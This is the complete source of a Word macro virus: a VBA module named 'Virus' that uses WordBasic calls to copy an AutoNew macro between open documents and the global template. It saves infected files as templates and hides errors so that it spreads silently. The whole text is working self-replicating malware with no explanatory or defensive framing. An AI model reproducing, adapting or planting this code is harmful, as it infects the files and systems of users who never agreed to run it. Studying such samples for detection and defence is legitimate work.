Attribute VB_Name = "Virus"

Public Sub MAIN()
Dim Here
Dim OurName$
Dim OurMacr$
Dim N
Dim i
On Error GoTo -1: On Error GoTo GoForward
Here = 0
OurName$ = WordBasic.[FileName$]()
OurMacr$ = OurName$ + ":AutoNew"
N = WordBasic.CountMacros(0, 0)
For i = 1 To N
 If WordBasic.[MacroName$](i, 0, 0) = "AutoNew" Then Here = -1
Next i
If Here = 0 Then WordBasic.MacroCopy OurMacr$, "AutoNew"
If Here = -1 Then
 WordBasic.MacroCopy "AutoNew", OurMacr$
 WordBasic.FileSaveAs Format:=1
End If
GoForward:
End Sub
